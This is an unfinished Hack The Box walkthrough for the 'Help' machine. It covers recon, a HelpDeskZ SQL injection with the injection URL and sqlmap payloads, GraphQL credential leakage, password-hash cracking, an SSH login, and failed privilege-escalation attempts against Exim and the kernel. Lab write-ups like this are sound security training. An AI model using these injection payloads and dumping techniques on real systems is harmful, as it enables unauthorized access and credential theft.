# [13 - Help](https://app.hackthebox.com/machines/Help)

![Help.png](Help.png)

## description
> 10.10.10.121

## walkthrough

### recon

```
$ nmap -sV -sC -A -Pn -p- help.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-08 18:33 MDT
Nmap scan report for help.htb (10.10.10.121)
Host is up (0.060s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### 80

while waiting for nmap, apache2 ubuntu default page


gobuster here - but then on to 3000

```
/.hta/                (Status: 403) [Size: 288]
/.htaccess/           (Status: 403) [Size: 293]
/.htpasswd/           (Status: 403) [Size: 293]
/icons/               (Status: 403) [Size: 289]
/javascript/          (Status: 403) [Size: 294]
/server-status/       (Status: 403) [Size: 297]
/support/             (Status: 200) [Size: 4413]
```

usual suspects, plus `/support`, which seems relevant

> HelpDeskZ

submit a ticket, news, knowledgebase, and `lost password`, but no way to signup for an account

can post a ticket, but they are using captchas, which means we likely can't sqlmap it


### 3000

whenever see `Express`, assume SSTI

```
$ curl http://help.htb:3000
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```

ok, so maybe a username, and likely a path forward

### HelpDeskZ exploit

[https://www.exploit-db.com/exploits/41200](https://www.exploit-db.com/exploits/41200)
> HelpDeskZ <= v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.
> Software after ticket submit allow to download attachment by entering following link: http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1(ATTACHMENT_ID_HERE)

```
FILE: view_tickets_controller.php
LINE 95:	$attachment = $db->fetchRow("SELECT *, COUNT(id) AS total FROM ".TABLE_PREFIX."attachments WHERE id=".$db->real_escape_string($params[2])." AND ticket_id=".$params[0]." AND msg_id=".$params[3]);
```

> third argument AND msg_id=".$params[3]; sent to fetchRow query with out any senitization. Steps to reproduce:

> http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1 or id>0 -- -

that seems pretty straight forward.. but we don't have a valid ticket ID or an attachment ID


```
location: http://help.htb/support/?v=submit_ticket&action=confirmationMsg&param[]=380-9AA-6BF09&param[]=16170425ef00
```

or maybe we do?

```
location: http://help.htb/support/?v=submit_ticket&action=confirmationMsg&param[]=DA0-BB1-FC7AD&param[]=ffbb16090f90
```

neither the 3-3-5 nor the 11 character strings appear to be the ticket IDs.

### coming back

think the exploit path we're on will work, but `rs.php` uploads lead to `File is not allowed`

  * tried the file as `rs.png` and it uploaded successfully, but wasn't found
  * tried the file as `rs.php` but with `Content-Type: image/png`, still file not allowed


going back to 3000 - `find the credentials with given query`.. thats graphql, right?

```
GET /graphql HTTP/1.1

...

HTTP/1.1 400 Bad Request
X-Powered-By: Express
Date: Thu, 11 Aug 2022 22:23:32 GMT
Connection: close
Content-Length: 18

GET query missing.
```

trying to get `http://help.htb:3000/graphql?help.htb:3000/graphql?query={__schema{types{name,fields{name}}}}` yields `Must provide query string`, so should write some code..

but actually, the param was bad - `http://help.htb:3000/graphql?query={__schema{types{name,fields{name}}}}` yields.. what we're looking for

curl does not like the nesting, so wget

```
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "fields": [
            {
              "name": "user"
            }
          ]
        },
        {
          "name": "User",
          "fields": [
            {
              "name": "username"
            },
            {
              "name": "password"
            }
          ]
        },

```

nice. now we just need to query for the values

username is likely `shiv`, so just need the password

```
$ wget "http://help.htb:3000/graphql?query={user {username,password} }"
--2022-08-11 16:31:38--  http://help.htb:3000/graphql?query=%7Buser%20%7Busername,password%7D%20%7D
Resolving help.htb (help.htb)... 10.10.10.121
Connecting to help.htb (help.htb)|10.10.10.121|:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 96 [application/json]
Saving to: ‘graphql?query={user {username,password} }’

graphql?query={user {username,password} }       100%[=====================================================================================================>]      96  --.-KB/s    in 0s

2022-08-11 16:31:38 (12.7 MB/s) - ‘graphql?query={user {username,password} }’ saved [96/96]

$ cat graphql\?query\=\{user\ \{username\,password\}\ \}  | jq .
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

nice. that looks like an md5 hash

```
$ john_rockyou users.hash --format='dynamic=md5($p)'
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic=md5($p) [256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
godhelpmeplz     (?)
1g 0:00:00:00 DONE (2022-08-11 16:33) 2.631g/s 20628Kp/s 20628Kc/s 20628KC/s godsgift2689..god777!!!
Use the "--show --format=dynamic=md5($p)" options to display all of the cracked passwords reliably
Session completed.

real    0m0.541s
user    0m0.360s
sys     0m0.142s
```

nice - but.. that does not work for `helpme` or `shiv` on ssh -- but it does get us in to the helpdeskz

and.. we can now use sqlmap to trigger the authenticated exploit that was not working unauthenticated..

```
$ sqlmap -r view_tickets2.txt --level 5
[16:54:38] [INFO] checking if the injection point on GET parameter 'param[]' is a false positive
GET parameter 'param[]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 510 HTTP(s) requests:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=7&param[]=attachment&param[]=3&param[]=9 AND 8529=8529

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=7&param[]=attachment&param[]=3&param[]=9 AND (SELECT 6831 FROM (SELECT(SLEEP(5)))cTlH)
---
[16:54:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[16:54:44] [INFO] fetched data logged to text files under '/home/conor/.local/share/sqlmap/output/help.htb'
```

nice...

```
$ sqlmap -r view_tickets2.txt --level 5 --risk 3 -p param[] --passwords
...
database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *5235DAA85DEEFA147A945B565DA3DE370CE8E5C9
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] root [1]:
    password hash: *AEC9BA84F3CBB00DE426B0E939C665E2D7391CC1

```

root hash falls
```
helpme           (?)
```

but what user does that belong to?


fine, dump the whole db
```
$ sqlmap -r view_tickets2.txt --level 5 --risk 3 -p param[] --dump --threads=10
...
Database: support
Table: users
[6 entries]
+----+-----------------------+--------+----------+------------------------------------------+------------------+------------+
| id | email                 | status | fullname | password                                 | timezone         | salutation |
+----+-----------------------+--------+----------+------------------------------------------+------------------+------------+
| 1  | helpme@helpme.com     | 1      | helpme   | c3b3bd1eb5142e29adb0044b16ee4d402d06f9ca | Indian/Christmas | 0          |
| 2  | lolololol@yopmail.com | 1      | xcvxv    | ec09fa0d0ba74336ea7fe392869adb198242f15a | NULL             | 0          |
| 3  | conor@help.htb        | 1      | fff      | 23fbce4e2719dcca15d18eebdae18e13eeb3ccb1 | NULL             | 0          |
| 4  | conor@help.htb        | 1      | dfsdfsd  | a08a479d45feedf6bc60135fa9408d97831469c3 | NULL             | 0          |
| 5  | conor@help.htb        | 1      | c        | 7738886fdcac7cd15657a878b513fabb86613791 | NULL             | 0          |
| 6  | conor@help.htb        | 1      | fff      | 4a0914c37ec903edac3ac652c8c00dcaa9f48fb5 | NULL             | 0          |
+----+-----------------------+--------+----------+------------------------------------------+------------------+------------+

```


we already no `helpme@helpme.com` and `lololol@yopmail.com` isn't popping.

but...

```
$ cat ~/.local/share/sqlmap/output/help.htb/dump/support/staff.csv.1
id,admin,email,login,avatar,status,fullname,password,timezone,username,signature,department,last_login,newticket_notification
1,1,support@mysite.com,1547216217,NULL,Enable,Administrator,d318f44739dced66793b1a603028133a76ae680e (Welcome1),<blank>,admin,"Best regards,\r\nAdministrator","a:1:{i:0;s:1:""1"";}",15434297
46,0
```

```
$ john_rockyou users2.hash
...
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (?)
1g 0:00:00:00 DONE (2022-08-11 19:18) 33.33g/s 1346Kp/s 1346Kc/s 1346KC/s abcdefghijklmnopqrstuvwxyz..TWEETYBIRD
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.

real    0m0.190s
user    0m0.051s
sys     0m0.113s
```

```
$ ssh -l help help.htb
Warning: Permanently added 'help.htb' (ED25519) to the list of known hosts.
help@help.htb's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$
help@help:~$ cat user.txt
0f25a3fbc3ef889f3e3abee1120035dc
```

nice.

### help on up

```
help@help:~$ ls -la
total 64
drwxr-xr-x   7 help help  4096 May  4 08:25 .
drwxr-xr-x   3 root root  4096 Nov 23  2021 ..
lrwxrwxrwx   1 root root     9 May  4 06:23 .bash_history -> /dev/null
-rw-r--r--   1 help help   220 Nov 27  2018 .bash_logout
-rw-r--r--   1 root root     1 Nov 27  2018 .bash_profile
-rw-r--r--   1 help help  3771 Nov 27  2018 .bashrc
drwx------   2 help help  4096 Nov 23  2021 .cache
drwxr-xr-x   4 help help  4096 Aug 11 14:41 .forever
drwxrwxrwx   6 root root  4096 May  4 08:27 help
lrwxrwxrwx   1 root root     9 May  4 06:40 .mysql_history -> /dev/null
drwxrwxr-x   2 help help  4096 Nov 23  2021 .nano
drwxrwxr-x 290 help help 12288 Nov 23  2021 .npm
-rw-rw-r--   1 help help     1 May  4 08:27 npm-debug.log
-rw-r--r--   1 help help   655 Nov 27  2018 .profile
-rw-rw-r--   1 help help    66 Nov 28  2018 .selected_editor
-rw-r--r--   1 root root    33 Aug 11 14:41 user.txt
help@help:~$ sudo -l
[sudo] password for help:
Sorry, user help may not run sudo on help.
help@help:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
@reboot /usr/local/bin/forever start /home/help/help/dist/bundle.js
```

`forever` looks like some attempt at initv/systemd that npm uses

```
You have new mail.
Last login: Fri Aug 12 07:27:35 2022 from 10.10.14.9
help@help:~$
help@help:~$ mail
s-nail version v14.8.6.  Type ? for help.
"/var/mail/help": 43 messages 1 new 42 unread
 U 41 Cron Daemon        Thu Aug 11 14:41   26/981   Cron <help@help> /usr/local/bin/forever start /home/help/help/dist/bundle.js
 O 42 help               Thu Aug 11 18:23   19/621   *** SECURITY information for help ***
>N 43 Mail Delivery Syst Thu Aug 11 18:27   54/1540  Mail delivery failed: returning message to sender
? 43
[-- Message 43 -- 54 lines, 1540 bytes --]:
From MAILER-DAEMON Thu Aug 11 18:27:17 2022
From: Mail Delivery System <Mailer-Daemon@ubuntu>
To: help@ubuntu
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1oMJSH-00057q-Cx@help>
Date: Thu, 11 Aug 2022 18:27:17 -0700

[-- #1 10/297 text/plain, 7bit, us-ascii --]

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  victim@localhost
    Unrouteable address

[-- #2 8/135 message/delivery-status, 7bit, US-ASCII --]


[-- #3 14/325 message/rfc822 --]

Message-Id: <E1oMJSE-00057m-CM@help>
From: help <help@ubuntu>
Date: Thu, 11 Aug 2022 18:27:16 -0700

dfddd

?
```

`victim@localhost`, but the last login IP was 10.10.14.9, and that wasn't us

combined with
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 1015K Feb 10  2018 /usr/sbin/exim4

...

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::3000                 :::*                    LISTEN      812/nodejs
tcp6       0      0 ::1:25                  :::*                    LISTEN      -

...

Debian-+   1267  0.0  0.3  55872  3204 ?        Ss   Aug11   0:00 /usr/sbin/exim4 -bd -q30m

```

thinking mail is the way up.

```
? 44
[-- Message 44 -- 18 lines, 610 bytes --]:
From help@ubuntu Fri Aug 12 07:27:52 2022
To: root@ubuntu
Subject: *** SECURITY information for help ***
From: help <help@ubuntu>
Message-Id: <E1oMVdg-000BL0-Qt@help>
Date: Fri, 12 Aug 2022 07:27:52 -0700

help : Aug 12 07:27:52 : help : 1 incorrect password attempt ; TTY=pts/0 ; PWD=/home/help ; USER=root ; COMMAND=list


?
help@help:~$ date
Fri Aug 12 07:40:45 PDT 2022
```

still the only user logged in, and didn't try and su/sudo commands. also - why are we getting mail to `root@ubuntu`?

```
help@help:~$ find / -iname '*exim*' 2>/dev/null | grep -v doc | grep -v dpkg
/usr/sbin/exim_tidydb
/usr/sbin/exim_dbmbuild
/usr/sbin/update-exim4defaults
/usr/sbin/exim_fixdb
/usr/sbin/update-exim4.conf.template
/usr/sbin/syslog2eximlog
/usr/sbin/exim
/usr/sbin/exim4
/usr/sbin/eximstats
/usr/sbin/exim_lock
/usr/sbin/update-exim4.conf
/usr/sbin/exim_checkaccess
/usr/sbin/exim_convert4r4
/usr/sbin/exim_dumpdb
/usr/lib/exim4
/usr/lib/exim4/exim4
/usr/share/man/man8/exim_tidydb.8.gz
/usr/share/man/man8/update-exim4.conf.template.8.gz
/usr/share/man/man8/exim4.8.gz
/usr/share/man/man8/syslog2eximlog.8.gz
/usr/share/man/man8/exim_convert4r4.8.gz
/usr/share/man/man8/exim_db.8.gz
/usr/share/man/man8/update-exim4.conf.8.gz
/usr/share/man/man8/exim_lock.8.gz
/usr/share/man/man8/eximstats.8.gz
/usr/share/man/man8/exim_dumpdb.8.gz
/usr/share/man/man8/exim.8.gz
/usr/share/man/man8/exim_checkaccess.8.gz
/usr/share/man/man8/exim_dbmbuild.8.gz
/usr/share/man/man8/update-exim4defaults.8.gz
/usr/share/man/man8/exim_fixdb.8.gz
/usr/share/man/man5/exim4_sender_local_deny_exceptions.5.gz
/usr/share/man/man5/exim4_exim_key.5.gz
/usr/share/man/man5/exim4_local_host_blacklist.5.gz
/usr/share/man/man5/exim4_passwd.5.gz
/usr/share/man/man5/exim4_exim_crt.5.gz
/usr/share/man/man5/update-exim4.conf.conf.5.gz
/usr/share/man/man5/exim4_local_sender_callout.5.gz
/usr/share/man/man5/exim4_hubbed_hosts.5.gz
/usr/share/man/man5/exim4-config_files.5.gz
/usr/share/man/man5/exim4_passwd_client.5.gz
/usr/share/man/man5/exim4_local_rcpt_callout.5.gz
/usr/share/man/man5/exim4_local_domain_dnsbl_whitelist.5.gz
/usr/share/man/man5/exim4_host_local_deny_exceptions.5.gz
/usr/share/man/man5/exim4_local_sender_blacklist.5.gz
/usr/share/lintian/overrides/exim4-config
/usr/share/lintian/overrides/exim4-daemon-light
/usr/share/bug/exim4-config
/usr/share/bug/exim4-base
/usr/share/bug/exim4
/usr/share/bug/exim4-daemon-light
/var/log/exim4
/var/lib/exim4
/var/spool/exim4
/etc/rc6.d/K01exim4
/etc/logrotate.d/exim4-base
/etc/logrotate.d/exim4-paniclog
/etc/default/exim4
/etc/init.d/exim4
/etc/ppp/ip-up.d/exim4
/etc/rc0.d/K01exim4
/etc/exim4
/etc/exim4/update-exim4.conf.conf
/etc/exim4/exim4.conf.template
/etc/exim4/conf.d/rewrite/00_exim4-config_header
/etc/exim4/conf.d/rewrite/31_exim4-config_rewriting
/etc/exim4/conf.d/router/900_exim4-config_local_user
/etc/exim4/conf.d/router/300_exim4-config_real_local
/etc/exim4/conf.d/router/850_exim4-config_lowuid
/etc/exim4/conf.d/router/400_exim4-config_system_aliases
/etc/exim4/conf.d/router/500_exim4-config_hubuser
/etc/exim4/conf.d/router/00_exim4-config_header
/etc/exim4/conf.d/router/150_exim4-config_hubbed_hosts
/etc/exim4/conf.d/router/200_exim4-config_primary
/etc/exim4/conf.d/router/100_exim4-config_domain_literal
/etc/exim4/conf.d/router/700_exim4-config_procmail
/etc/exim4/conf.d/router/800_exim4-config_maildrop
/etc/exim4/conf.d/router/600_exim4-config_userforward
/etc/exim4/conf.d/acl/20_exim4-config_local_deny_exceptions
/etc/exim4/conf.d/acl/00_exim4-config_header
/etc/exim4/conf.d/acl/30_exim4-config_check_rcpt
/etc/exim4/conf.d/acl/30_exim4-config_check_mail
/etc/exim4/conf.d/acl/40_exim4-config_check_data
/etc/exim4/conf.d/main/90_exim4-config_log_selector
/etc/exim4/conf.d/main/03_exim4-config_tlsoptions
/etc/exim4/conf.d/main/01_exim4-config_listmacrosdefs
/etc/exim4/conf.d/main/02_exim4-config_options
/etc/exim4/conf.d/auth/00_exim4-config_header
/etc/exim4/conf.d/auth/30_exim4-config_examples
/etc/exim4/conf.d/transport/35_exim4-config_address_directory
/etc/exim4/conf.d/transport/00_exim4-config_header
/etc/exim4/conf.d/transport/30_exim4-config_address_pipe
/etc/exim4/conf.d/transport/30_exim4-config_maildir_home
/etc/exim4/conf.d/transport/30_exim4-config_remote_smtp_smarthost
/etc/exim4/conf.d/transport/30_exim4-config_procmail_pipe
/etc/exim4/conf.d/transport/10_exim4-config_transport-macros
/etc/exim4/conf.d/transport/30_exim4-config_mail_spool
/etc/exim4/conf.d/transport/30_exim4-config_address_file
/etc/exim4/conf.d/transport/30_exim4-config_remote_smtp
/etc/exim4/conf.d/transport/30_exim4-config_address_reply
/etc/exim4/conf.d/transport/30_exim4-config_maildrop_pipe
/etc/exim4/conf.d/retry/00_exim4-config_header
/etc/exim4/conf.d/retry/30_exim4-config
/etc/rc2.d/S04exim4
/etc/cron.daily/exim4-base
/etc/rc3.d/S04exim4
/etc/rc1.d/K01exim4
/etc/rc5.d/S04exim4
/etc/rc4.d/S04exim4
/run/exim4
/run/systemd/generator.late/exim4.service
/run/systemd/generator.late/graphical.target.wants/exim4.service
/run/systemd/generator.late/multi-user.target.wants/exim4.service
/sys/fs/cgroup/devices/system.slice/exim4.service
/sys/fs/cgroup/systemd/system.slice/exim4.service
```

```
help@help:/etc/exim4$ nc localhost 25
220 help ESMTP Exim 4.86_2 Ubuntu Fri, 12 Aug 2022 07:54:33 -0700
```

```
help@help:/etc/exim4$ exim --version
Exim version 4.86_2 #2 built 10-Feb-2018 19:18:40
Copyright (c) University of Cambridge, 1995 - 2015
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2015
Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC PRDR OCSP
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
Authenticators: cram_md5 plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Size of off_t: 8
Configuration file is /var/lib/exim4/config.autogenerated

```

the `Support for:` line does not include 'Perl', so we can't use `~/git/searchsploit/exploits/linux/local/39549.txt`


### suggested exploits

```
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010
```


af_packet, chocobo_root.c
```
help@help:~$ ./a.out
./a.out: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./a.out)
./a.out: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./a.out)
./a.out: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./a.out)
```

exploit_x
```
help@help:~$ bash foo.sh
[+] OpenBSD 6.4-stable local root exploit
foo.sh: line 12: Xorg: command not found
^C
```

get_rekt
```
help@help:~$ ./a.out
./a.out: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./a.out)
```

libc is out of date
```
help@help:~$ ls /lib/x86_64-linux-gnu/libc.so.6
lrwxrwxrwx 1 root root 12 Nov 27  2018 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.23.so
```

### it's got to be the mail

```
help@help:~$ cat /var/log/exim4/mainlog
...
2022-05-04 08:17:54 End queue run: pid=1163
2022-08-14 11:48:58 1oNIfS-0000D1-L6 <= help@ubuntu U=help P=local S=829
2022-08-14 11:48:58 1oNIfS-0000D1-L6 => help <help@ubuntu> R=local_user T=mail_spool
2022-08-14 11:48:58 1oNIfS-0000D1-L6 Completed
2022-08-14 11:49:01 exim 4.86_2 daemon started: pid=1266, -q30m, listening for SMTP on [127.0.0.1]:25 [::1]:25
2022-08-14 11:49:01 Start queue run: pid=1270
2022-08-14 11:49:01 End queue run: pid=1270
2022-08-14 11:51:45 1oNIi9-00024j-V2 <= help@ubuntu U=help P=local S=468
2022-08-14 11:51:45 1oNIi9-00024j-V2 => help <root@ubuntu> R=local_user T=mail_spool
2022-08-14 11:51:45 1oNIi9-00024j-V2 Completed
2022-08-14 11:59:20 1oNIpU-0004xH-R1 <= help@ubuntu U=help P=local S=459
2022-08-14 11:59:20 1oNIpU-0004xH-R1 => help <root@ubuntu> R=local_user T=mail_spool
2022-08-14 11:59:20 1oNIpU-0004xH-R1 Completed
2022-08-14 12:19:01 Start queue run: pid=19203
2022-08-14 12:19:01 End queue run: pid=19203
2022-08-14 12:49:01 Start queue run: pid=19248
2022-08-14 12:49:01 End queue run: pid=19248
help@help:~$ ps aux | grep 1266
Debian-+   1266  0.0  0.2  55872  2680 ?        Ss   11:49   0:00 /usr/sbin/exim4 -bd -q30m

```

googling around

### coming back again

linpeas

```
╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=2c0651e2-31d6-496e-b2bc-1583ee4d7730 /               ext4    errors=remount-ro 0       1
/dev/sda2        none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

...
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/lib/systemd/system/emergency.service is executing some relative path

...

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::3000                 :::*                    LISTEN      800/nodejs
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

...
╔══════════╣ Analyzing Cache Vi Files (limit 70)
-rw-r--r-- 1 root root 1024 Nov 27  2018 /etc/apache2/.apache2.conf.swp


```

```
>N 42 help               Sat Jan 07 08:08   18/610   *** SECURITY information for help ***
? 42
[-- Message 42 -- 18 lines, 610 bytes --]:
From help@ubuntu Sat Jan 07 08:08:11 2023
To: root@ubuntu
Subject: *** SECURITY information for help ***
From: help <help@ubuntu>
Message-Id: <E1pEBjv-00025Q-K9@help>
Date: Sat, 07 Jan 2023 08:08:11 -0800

help : Jan  7 08:08:11 : help : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/home/help ; USER=root ; COMMAND=list
```

```
help@help:~$ screen -v
Screen version 4.03.01 (GNU) 28-Jun-15

```

looking at exploitdb

```
GNU Screen 3.9.x Braille Module - Local Buffer Overflow                                                                                                     | unix/local/21414.c
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                               | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                         | linux/local/41152.txt
...
Screen 4.0.3 (OpenBSD) - Local Authentication Bypass                                                                                                        | linux/local/4028.txt
```

`4028.txt` is a no go, as is `41154.sh`, and `21414.c` is not applicable


```
help@help:/var/www/html/support$ mail help@help
Subject: foobar
this is a test


.
help@help:/var/www/html/support$ mail root@help
Subject: fizzbuzz
this is also a test

.

help@help:/var/www/html/support$ mail
...
>N 44 help               Sat Jan 07 12:44   19/468   foobar
 N 45 help               Sat Jan 07 12:44   18/474   fizzbuzz
? 4
[-- Message  4 -- 19 lines, 629 bytes --]:
From help@ubuntu Wed Nov 28 11:33:27 2018
To: root@ubuntu
Subject: *** SECURITY information for ubuntu ***
From: help <help@ubuntu>
Message-Id: <E1gS5aR-0000OX-83@ubuntu>
Date: Wed, 28 Nov 2018 11:33:27 -0800

ubuntu : Nov 28 11:33:26 : help : 1 incorrect password attempt ; TTY=pts/0 ; PWD=/home/help ; USER=root ; COMMAND=list


? 5
[-- Message  5 -- 19 lines, 629 bytes --]:
From help@ubuntu Wed Nov 28 11:33:29 2018
To: root@ubuntu
Subject: *** SECURITY information for ubuntu ***
From: help <help@ubuntu>
Message-Id: <E1gS5aS-0000Ok-PP@ubuntu>
Date: Wed, 28 Nov 2018 11:33:28 -0800

ubuntu : Nov 28 11:33:28 : help : 1 incorrect password attempt ; TTY=pts/0 ; PWD=/home/help ; USER=root ; COMMAND=list


?
```

so looks like whatever we mail to, it gets to `help@ubuntu`


```
help@help:~$ date
Sat Jan  7 12:43:05 PST 2023
help@help:~$ tail -f /var/log/exim4/mainlog 
2023-01-07 10:54:51 1pEELD-00054E-Jl Completed
2023-01-07 10:57:53 Start queue run: pid=19560
2023-01-07 10:57:53 End queue run: pid=19560
2023-01-07 11:01:31 SIGINT received while reading local message
2023-01-07 11:27:53 Start queue run: pid=19624
2023-01-07 11:27:53 End queue run: pid=19624
2023-01-07 11:57:53 Start queue run: pid=19668
2023-01-07 11:57:53 End queue run: pid=19668
2023-01-07 12:27:53 Start queue run: pid=19715
2023-01-07 12:27:53 End queue run: pid=19715


2023-01-07 12:44:18 1pEG38-0005AL-6K <= help@ubuntu U=help P=local S=328
2023-01-07 12:44:18 1pEG38-0005AL-6K => help <help@help> R=local_user T=mail_spool
2023-01-07 12:44:18 1pEG38-0005AL-6K Completed

2023-01-07 12:44:39 1pEG3T-0005AR-0v <= help@ubuntu U=help P=local S=334
2023-01-07 12:44:39 1pEG3T-0005AR-0v => help <root@help> R=local_user T=mail_spool
2023-01-07 12:44:39 1pEG3T-0005AR-0v Completed
2023-01-07 12:46:53 1pEG5d-0005Ah-F4 <= help@ubuntu U=help P=local S=313
2023-01-07 12:46:53 1pEG5d-0005Ah-F4 => help <root@help> R=local_user T=mail_spool
2023-01-07 12:46:53 1pEG5d-0005Ah-F4 Completed


2023-01-07 12:57:53 Start queue run: pid=19892
2023-01-07 12:57:53 End queue run: pid=19892
2023-01-07 13:27:53 Start queue run: pid=19939
2023-01-07 13:27:53 End queue run: pid=19939
2023-01-07 13:57:53 Start queue run: pid=19985
2023-01-07 13:57:53 End queue run: pid=19985
2023-01-07 14:27:53 Start queue run: pid=20032
2023-01-07 14:27:53 End queue run: pid=20032
^C
help@help:~$ date
Sat Jan  7 14:49:00 PST 2023
```

## flag
```
user:
root:
```
